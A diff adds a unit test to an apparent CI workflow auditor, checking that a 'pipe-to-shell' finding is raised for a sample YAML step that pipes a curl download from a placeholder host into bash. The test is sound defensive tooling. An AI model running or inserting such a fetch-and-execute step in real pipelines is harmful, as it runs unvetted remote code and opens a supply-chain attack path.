@@ -42,6 +42,30 @@ test("severity summary counts findings by level", async () => {
   assert.ok(report.severitySummary.low >= 2);
 });
 
+
+test("auditWorkflow detects pipe-to-shell commands inside block run steps", () => {
+  const findings = auditWorkflow({
+    path: "/tmp/ci.yml",
+    relativePath: "ci.yml",
+    content: `name: CI
+permissions:
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - run: |
+          echo preparing
+          curl https://example.invalid/install.sh | bash
+          npm test
+`,
+  });
+  const finding = findings.find((candidate) => candidate.id === "pipe-to-shell");
+  assert.ok(finding);
+  assert.equal(finding.line, 11);
+});
+
 test("auditWorkflow recommends npm ci for reproducible installs", () => {
   const findings = auditWorkflow({
     path: "/tmp/ci.yml",
